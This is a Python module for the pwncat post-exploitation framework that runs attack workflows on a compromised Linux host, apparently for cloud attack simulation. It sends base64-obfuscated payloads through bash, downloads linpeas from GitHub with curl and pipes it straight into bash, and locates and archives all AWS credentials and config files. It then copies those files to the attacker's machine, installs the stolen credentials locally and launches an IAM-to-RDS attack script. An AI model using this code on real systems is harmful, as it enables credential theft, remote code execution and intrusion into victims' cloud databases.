#!/usr/bin/env python3
from io import StringIO
import os 
from pwncat import util
from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from jinja2 import Environment, FileSystemLoader
from pathlib import Path
import subprocess
import shutil
import tarfile
import base64

class Module(BaseModule):
    """ 
    Responder module - use TASK environment variable to execute specific workflow 
    """
    """
    Usage: run responder 
    """
    PLATFORM = [Linux]
    ARGUMENTS = {}

    def run(self, session: Session):
        yield Status( "preparing to pwn the [red]world[/red]")
        hostname = session.platform.getenv('HOSTNAME')
        session.log(f'hostname: {hostname}')
        script_dir = os.path.dirname(os.path.realpath(__file__))
        session.log(f"script dir: {script_dir}")
        task_name = session.platform.getenv("TASK")
        session.log(f"task environment: {task_name}")
        if task_name == "instance2rds":
            session.log(f"reading payload: {script_dir}/../resources/instance2rds.sh")
            try:
                payload = base64.b64encode(Path(f'{script_dir}/../resources/instance2rds.sh').read_bytes())
                session.log("payload loaded and ready")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instance2rds | base64 -d | /bin/bash &'")
                session.log(result)
            except Exception as e:
                session.log(f"error: {e}")
        elif task_name == "iam2rds":
            try:
                session.log(f"setting up templates directory: {script_dir}/../resources")
                file_loader = FileSystemLoader(f'{script_dir}/../resources')
                env = Environment(loader=file_loader)

                # run host enumeration
                payload = base64.b64encode(b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt')
                session.log("payload loaded and ready")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'")
                session.log(result)

                # run a local assume role...not ideal but ensures local usage
                payload = base64.b64encode(Path(f'{script_dir}/../resources/iam2rds_assumerole.sh').read_bytes())
                session.log("payload loaded and ready")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_assumerole | base64 -d | /bin/bash'")
                session.log(result)

                # remove any pre-existing cred archived
                if session.platform.Path('/tmp/aws_creds.tgz').exists():
                    session.platform.unlink('/tmp/aws_creds.tgz')

                # create an archive of all aws creds
                payload = base64.b64encode(b"find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n'")
                session.log("running credentials find...")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'")
                session.log(result)

                # create an archive of all aws creds
                payload = base64.b64encode(b"tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n')")
                session.log("payload loaded and ready")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'")
                session.log(result)
                
                # cleanup any existing local cred archives for this host
                if Path(f'/tmp/{hostname}_aws_creds.tgz').exists():
                    os.unlink(f'/tmp/{hostname}_aws_creds.tgz')
                
                # transfer files from target to attacker
                session.log("copying /tmp/aws_creds.tgz...")
                with session.platform.open('/tmp/aws_creds.tgz', 'rb') as f1:
                    with open(f'/tmp/{hostname}_aws_creds.tgz','wb') as f2:
                        f2.write(f1.read())
                
                session.log("copying /tmp/linpeas.txt...")
                with session.platform.open('/tmp/linpeas.txt', 'rb') as f1:
                    with open(f'/tmp/{hostname}_linpeas.txt','wb') as f2:
                        f2.write(f1.read())

                # remove temporary archive from target
                if session.platform.Path('/tmp/aws_creds.tgz').exists():
                    session.platform.unlink('/tmp/aws_creds.tgz')
                
                # create iam2rds work directory
                iam2rds_path = Path("/iam2rds")
                if iam2rds_path.exists() and iam2rds_path.is_dir():
                    shutil.rmtree(iam2rds_path)
                iam2rds_path.mkdir(parents=True)

                # create aws directory
                aws_dir = Path.joinpath(Path.home(),Path(".aws"))
                if aws_dir.exists() and aws_dir.is_dir():
                    shutil.rmtree(aws_dir)
                aws_dir.mkdir(parents=True)

                # extract the aws creds
                file = tarfile.open(f'/tmp/{hostname}_aws_creds.tgz')
                file.extract('root/.aws/credentials', iam2rds_path)
                file.extract('root/.aws/config', iam2rds_path)
                shutil.copy2(Path.joinpath(iam2rds_path, 'root/.aws/credentials'),Path.joinpath(aws_dir, 'credentials'))
                shutil.copy2(Path.joinpath(iam2rds_path, 'root/.aws/config'),Path.joinpath(aws_dir, 'config'))
                
                # copy our payload to the local working directory
                iam2rds = Path(f"{script_dir}/../resources/iam2rds.sh")
                shutil.copy2(iam2rds, iam2rds_path)

                # copy linpeas.txt into our working directory
                linpeas = Path(f'/tmp/{hostname}_linpeas.txt')
                shutil.copy2(linpeas, iam2rds_path)
                
                # execute script
                bash_script = Path.joinpath(iam2rds_path,"iam2rds.sh")
                try:
                    result = subprocess.run(['/bin/bash', str(bash_script)], cwd=iam2rds_path, capture_output=True, text=True)
                    session.log(f'Return Code: {result.returncode}')
                    session.log(f'Output: {result.stdout}')
                    session.log(f'Error Output: {result.stderr}')
                    
                    if result.returncode != 0:
                        session.log(f'The bash script encountered an error.')
                except Exception as e:
                    session.log(f'Error executing bash script: {e}')
            except Exception as e:
                session.log(f"error: {e}")
        else:
            result = session.platform.run("${default_payload}")
            session.log(result)

        session.log( f"ran {self.name}")